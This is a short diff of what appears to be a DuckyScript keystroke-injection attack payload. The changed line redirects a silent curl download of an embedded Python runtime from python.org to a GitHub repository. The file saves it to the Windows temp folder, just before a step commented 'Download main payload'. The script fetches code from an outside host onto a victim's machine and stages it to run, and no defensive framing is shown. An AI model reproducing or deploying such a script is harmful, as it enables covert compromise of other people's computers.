@@ -68,7 +68,7 @@ DEFAULT_DELAY 50
 
 REM Download python
 RUN()
-STRINGLN curl -q -s --create-dirs --output-dir %localappdata%\Temp\py\ -o tmp.zip https://www.python.org/ftp/python/3.13.5/python-3.13.5-embed-amd64.zip
+STRINGLN curl -q -s --create-dirs --output-dir %localappdata%\Temp\py\ -o tmp.zip https://raw.githubusercontent.com/x-9917638/HackyDucky/refs/heads/main/python-embedded.zip
 
 REM Download main payload
 RUN()
